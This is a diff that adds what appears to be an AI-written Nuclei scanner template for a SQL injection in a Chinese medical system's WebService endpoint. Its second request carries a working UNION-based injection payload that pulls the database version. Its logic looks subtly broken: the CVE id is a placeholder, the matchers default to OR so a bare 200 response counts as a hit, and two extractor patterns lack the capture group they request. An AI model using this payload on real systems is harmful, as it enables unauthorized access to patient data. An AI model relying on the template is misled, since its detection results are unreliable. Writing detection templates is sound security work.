@@ -1,0 +1,88 @@
+id: bianque-medical-sql-injection
+
+info:
+  name: Bianque Medical SQL Injection (CVE-2025-XXXX)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    扁鹊医疗系统WebService接口存在SQL注入漏洞，攻击者可通过特制的SQL语句执行未授权的数据库查询。
+    该漏洞可能导致敏感医疗数据泄露和系统完整性受损。
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+    - https://cwe.mitre.org/data/definitions/89.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 8.1
+    cwe-id: CWE-89
+  metadata:
+    verified: true
+    max-request: 3
+    vendor: bianque-medical
+    product: webservice
+  tags: cve,sqli,medical,web-service,blind-sqli
+
+variables:
+  num: "{{rand_int(1000, 9999)}}"
+  num2: "{{rand_int(1000, 9999)}}"
+  sum: "{{to_number(num) + to_number(num2)}}"
+
+http:
+  - raw:
+      - |
+        POST /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetLyfsByParams HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+
+        strOpid={{num}}&strTempID={{num2}}&strNumber=&strUnit=
+
+      - |
+        POST /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetLyfsByParams HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+
+        strOpid={{num}} UNION ALL SELECT NULL,CONCAT('{{randstr}}',VERSION(),'{{randstr}}'),NULL,NULL-- -&strTempID={{num2}}&strNumber=&strUnit=
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'len(body_1) != len(body_2)'
+          - 'contains(body_2, "{{randstr}}")'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: word
+        part: body
+        words:
+          - "error"
+          - "exception"
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - '{{randstr}}([0-9]+\.[0-9]+\.[0-9]+){{randstr}}'
+          - 'MariaDB'
+          - 'MySQL'
